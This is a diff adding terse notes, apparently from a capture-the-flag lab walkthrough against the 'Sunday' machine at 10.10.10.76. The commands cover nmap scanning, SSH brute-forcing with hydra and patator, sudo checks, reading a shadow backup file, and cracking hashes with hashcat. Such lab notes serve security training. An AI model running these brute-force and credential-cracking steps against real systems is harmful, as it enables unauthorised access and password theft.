@@ -1,0 +1,24 @@
+nmap -sC -sV -oA nmap/sunday 10.10.10.76
+msfdb run
+
+| less -S
+nmap -p- -oA allports.nmap 10.10.10.76 --max-retries 0
+
+ssh -p 22022 sunny@10.10.10.76
+ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+
+hydra -l sunny -p sunday ssh://10.10.10.76:22022
+patator ssh_login user=sunny host=10.10.10.76 port=22022 password=FILE0 0=(password file) -x ignore:fgrep='failed'
+
+cd /usr/share/seclists/Passwords/
+find . -type f -exec wc -l {} \; | sort -nr
+
+sudo -l
+sudo /root/troll
+cd /backup
+cat shadow.backup
+
+hashcat.net
+./hashcat -m 7400
+
+
